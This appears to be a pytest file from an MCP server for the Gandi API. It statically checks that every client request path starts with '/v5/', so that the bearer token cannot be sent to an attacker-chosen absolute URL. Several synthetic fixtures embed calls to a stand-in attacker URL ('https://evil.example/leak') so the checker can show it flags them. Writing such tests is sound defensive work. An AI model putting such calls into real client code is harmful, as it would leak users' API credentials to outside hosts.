"""AST invariant: every GandiClient request path starts with ``/v5/`` (closes #41).

httpx follows an absolute URL passed as the request ``path`` and overrides
``base_url`` — so an attacker- or LLM-controlled absolute path would carry the
``Authorization: Bearer <PAT>`` header to a chosen host. Today every path in
``clients/gandi.py`` is a hardcoded literal (or an f-string assembled from
``_seg()``-encoded segments) starting with ``/v5/``. This test pins that
property statically so a regression — for example, a method like
``async def custom(self, path: str) -> Any: return await self.get(path)`` —
fails CI rather than reaching production.
"""

from __future__ import annotations

import ast
import inspect

from gandi_mcp.clients import gandi

HTTP_METHODS = frozenset({"get", "post", "put", "patch", "delete"})
PATH_PREFIX = "/v5/"


def _is_self_http_call(node: ast.AST) -> bool:
    """True if ``node`` is ``self.<http>(...)``.

    Matches only ``Call`` (not the surrounding ``Await``) so a single awaited
    call is reported once, not twice, when traversed via ``ast.walk``.
    """
    if not isinstance(node, ast.Call):
        return False
    func = node.func
    if not isinstance(func, ast.Attribute):
        return False
    if not (isinstance(func.value, ast.Name) and func.value.id == "self"):
        return False
    return func.attr in HTTP_METHODS


def _starts_with_prefix(value: ast.expr) -> bool:
    """``value`` evaluates to a string starting with ``/v5/``.

    Handles a string ``Constant`` and an f-string (``JoinedStr``) whose first
    segment is a ``Constant`` starting with the prefix.
    """
    if isinstance(value, ast.Constant) and isinstance(value.value, str):
        return value.value.startswith(PATH_PREFIX)
    if isinstance(value, ast.JoinedStr) and value.values:
        first = value.values[0]
        return isinstance(first, ast.Constant) and isinstance(first.value, str) and first.value.startswith(PATH_PREFIX)
    return False


def _is_self_extension(value: ast.expr, name: str) -> bool:
    """``value`` is ``f"{name}/..."`` — extending an existing local."""
    if not isinstance(value, ast.JoinedStr) or not value.values:
        return False
    first = value.values[0]
    if not isinstance(first, ast.FormattedValue):
        return False
    return isinstance(first.value, ast.Name) and first.value.id == name


def _own_calls(method: ast.AsyncFunctionDef | ast.FunctionDef) -> list[ast.Call]:
    """Yield every ``Call`` lexically inside ``method`` excluding nested defs.

    ``ast.walk`` descends into nested ``AsyncFunctionDef`` / ``FunctionDef`` /
    ``Lambda`` bodies, which would cause an inner method's ``self.get(path)`` to
    be evaluated against the *outer* method's local-assignment scope — producing
    spurious offenders. Stop descending at any function boundary.
    """
    out: list[ast.Call] = []
    stack: list[ast.AST] = list(method.body)
    while stack:
        node = stack.pop()
        if isinstance(node, ast.Call):
            out.append(node)
        # Don't descend into a nested function/lambda body — those are scanned
        # separately by the outer iterator.
        if isinstance(node, ast.AsyncFunctionDef | ast.FunctionDef | ast.Lambda):
            continue
        stack.extend(ast.iter_child_nodes(node))
    return out


def _own_assignments_to(method: ast.AsyncFunctionDef | ast.FunctionDef, name: str) -> list[ast.expr]:
    """Every assignment to ``name`` lexically inside ``method`` excluding nested defs.

    Captures plain ``Assign``, ``AnnAssign``, ``AugAssign`` (e.g. ``path += x``),
    and walrus ``NamedExpr`` (``(path := x)``). Plain and annotated assignments
    return the RHS as the bound value; AugAssign and walrus return a sentinel
    ``ast.Name(id="<unsafe>")`` because the resulting value may incorporate
    arbitrary RHS data not visible to the prefix check — fail closed.
    """
    found: list[ast.expr] = []
    stack: list[ast.AST] = list(method.body)
    while stack:
        node = stack.pop()
        if isinstance(node, ast.Assign):
            found.extend(node.value for target in node.targets if isinstance(target, ast.Name) and target.id == name)
        elif (
            isinstance(node, ast.AnnAssign)
            and node.value is not None
            and isinstance(node.target, ast.Name)
            and node.target.id == name
        ):
            found.append(node.value)
        elif isinstance(node, ast.AugAssign) and isinstance(node.target, ast.Name) and node.target.id == name:
            # path += x — value is (current path) ++ (x); not a clean bootstrap
            # or extension. Fail closed.
            found.append(ast.Name(id="<unsafe>"))
        elif isinstance(node, ast.NamedExpr) and isinstance(node.target, ast.Name) and node.target.id == name:
            # (path := x) — RHS could be anything. Fail closed unless RHS is
            # itself a /v5/-prefixed expression (then keep the prefix invariant).
            found.append(node.value if _starts_with_prefix(node.value) else ast.Name(id="<unsafe>"))
        if isinstance(node, ast.AsyncFunctionDef | ast.FunctionDef | ast.Lambda):
            continue
        stack.extend(ast.iter_child_nodes(node))
    return found


def _local_resolves_to_v5_prefix(method: ast.AsyncFunctionDef | ast.FunctionDef, name: str) -> bool:
    """A local ``name`` resolves to a ``/v5/``-prefixed string.

    Requires at least one bootstrap assignment that begins with ``/v5/`` and
    every other assignment to be either another bootstrap or an extension of
    the same name (``f"{name}/..."``). Any AugAssign or walrus injection of
    untrusted data is rejected — the sentinel ``Name("<unsafe>")`` placeholder
    fails both the prefix and extension checks.
    """
    assignments = _own_assignments_to(method, name)
    if not assignments:
        return False
    has_bootstrap = any(_starts_with_prefix(v) for v in assignments)
    all_ok = all(_starts_with_prefix(v) or _is_self_extension(v, name) for v in assignments)
    return has_bootstrap and all_ok


def _path_arg_is_safe(method: ast.AsyncFunctionDef | ast.FunctionDef, call: ast.Call) -> bool:
    if not call.args:
        return False
    arg = call.args[0]
    if _starts_with_prefix(arg):
        return True
    if isinstance(arg, ast.Name):
        return _local_resolves_to_v5_prefix(method, arg.id)
    return False


def _toplevel_methods(tree: ast.Module) -> list[ast.AsyncFunctionDef | ast.FunctionDef]:
    """Every method-shaped function defined directly inside any class body.

    Skips nested function defs so each call is checked against exactly one
    enclosing scope.
    """
    out: list[ast.AsyncFunctionDef | ast.FunctionDef] = []
    for cls in ast.walk(tree):
        if not isinstance(cls, ast.ClassDef):
            continue
        out.extend(stmt for stmt in cls.body if isinstance(stmt, ast.AsyncFunctionDef | ast.FunctionDef))
    return out


def test_all_client_paths_start_with_v5() -> None:
    """Every ``self.<http>(path, ...)`` call uses a ``/v5/``-prefixed path."""
    tree = ast.parse(inspect.getsource(gandi))
    offenders: list[str] = []
    checked = 0
    for method in _toplevel_methods(tree):
        for call in _own_calls(method):
            if not _is_self_http_call(call):
                continue
            checked += 1
            if not _path_arg_is_safe(method, call):
                offenders.append(f"{method.name}: {ast.unparse(call)}")
    assert not offenders, "client paths missing /v5/ prefix:\n  " + "\n  ".join(offenders)
    assert checked > 0, "AST walker found no self.<http>() calls — test is no-op"


def test_prefix_helper_recognizes_v5_literal() -> None:
    good = ast.parse('"/v5/foo"', mode="eval").body
    assert _starts_with_prefix(good)


def test_prefix_helper_rejects_absolute_url() -> None:
    bad = ast.parse('"https://evil.example/leak"', mode="eval").body
    assert not _starts_with_prefix(bad)


def test_prefix_helper_accepts_v5_fstring() -> None:
    expr = ast.parse('f"/v5/domain/{x}"', mode="eval").body
    assert _starts_with_prefix(expr)


def test_prefix_helper_rejects_attacker_fstring() -> None:
    expr = ast.parse('f"{user}/v5/foo"', mode="eval").body
    assert not _starts_with_prefix(expr)


def test_local_var_extension_resolves() -> None:
    src = (
        "async def m(self):\n"
        '    path = f"/v5/livedns/{x}"\n'
        '    path = f"{path}/extra"\n'
        "    return await self.get(path)\n"
    )
    method = ast.parse(src).body[0]
    assert isinstance(method, ast.AsyncFunctionDef)
    assert _local_resolves_to_v5_prefix(method, "path")


def test_local_var_without_bootstrap_fails() -> None:
    src = "async def m(self, user):\n    path = user\n    return await self.get(path)\n"
    method = ast.parse(src).body[0]
    assert isinstance(method, ast.AsyncFunctionDef)
    assert not _local_resolves_to_v5_prefix(method, "path")


# ── Mutation tests — confirm the walker FLAGS unsafe patterns end-to-end ────


def _run_walker(src: str) -> list[str]:
    """Run the full walker against synthetic source; return offender strings."""
    tree = ast.parse(src)
    offenders: list[str] = []
    for method in _toplevel_methods(tree):
        for call in _own_calls(method):
            if not _is_self_http_call(call):
                continue
            if not _path_arg_is_safe(method, call):
                offenders.append(f"{method.name}: {ast.unparse(call)}")
    return offenders


def test_walker_flags_parameter_as_path() -> None:
    """A ``self.get(path)`` where ``path`` is a parameter must be flagged."""
    src = "class C:\n    async def custom(self, path: str):\n        return await self.get(path)\n"
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag a parameter-as-path call"
    assert "custom" in offenders[0]


def test_walker_flags_absolute_url_literal() -> None:
    """A literal absolute URL must be flagged even though it's a string constant."""
    src = "class C:\n    async def leak(self):\n        return await self.get('https://evil.example/leak')\n"
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag an absolute-URL literal"


def test_walker_flags_augassign_extension() -> None:
    """``path = f'/v5/x'; path += user_input; self.get(path)`` must fail closed.

    The AugAssign concatenates arbitrary RHS data onto an otherwise-safe
    bootstrap. Without this guard a future contributor could route attacker
    data through ``+=`` and slip past the prefix check.
    """
    src = (
        "class C:\n"
        "    async def grow(self, user):\n"
        "        path = f'/v5/x'\n"
        "        path += user\n"
        "        return await self.get(path)\n"
    )
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag an AugAssign-extended path"
    assert "grow" in offenders[0]


def test_walker_flags_walrus_overwriting_path() -> None:
    """``(path := user)`` after a safe bootstrap must fail closed."""
    src = (
        "class C:\n"
        "    async def w(self, user):\n"
        "        path = f'/v5/x'\n"
        "        if (path := user):\n"
        "            return await self.get(path)\n"
        "        return None\n"
    )
    offenders = _run_walker(src)
    assert offenders, "walker failed to flag a walrus-overwritten path"


def test_walker_does_not_double_walk_nested_async_def() -> None:
    """A nested AsyncFunctionDef must not produce a spurious offender.

    ``ast.walk(tree)`` yields nested AsyncFunctionDefs as siblings of the
    outer one. Without scope isolation the inner ``self.get(path)`` would
    be evaluated *also* against the outer method's locals (where ``path``
    isn't bound) → spurious offender → CI breakage on a benign refactor.
    """
    src = (
        "class C:\n"
        "    async def outer(self, x):\n"
        "        async def inner():\n"
        "            path = f'/v5/x/{x}'\n"
        "            return await self.get(path)\n"
        "        return await inner()\n"
    )
    offenders = _run_walker(src)
    assert not offenders, f"walker double-walked nested async def: {offenders}"


def test_walker_flags_unsafe_call_in_nested_async_def() -> None:
    """Inverse of the previous: an unsafe nested call must still be caught.

    Scope isolation must not become 'silently skip nested defs' — the inner
    call is still inside a class method body once we recurse into nested
    function defs separately.
    """
    src = (
        "class C:\n"
        "    async def outer(self, x):\n"
        "        async def inner(self_, p):\n"
        "            return await self_.get(p)\n"
        "        return await inner(self, x)\n"
    )
    # Nested async defs aren't enumerated by _toplevel_methods (they live
    # inside outer's body, not directly inside the class), so the walker
    # neither passes nor flags them. That's documented limitation #74. For
    # this PR we only assert no DOUBLE-WALK false positive — no claim about
    # full coverage of nested-helper calls.
    offenders = _run_walker(src)
    # outer() makes no self.<http>() call, so the walker reports nothing.
    assert offenders == []
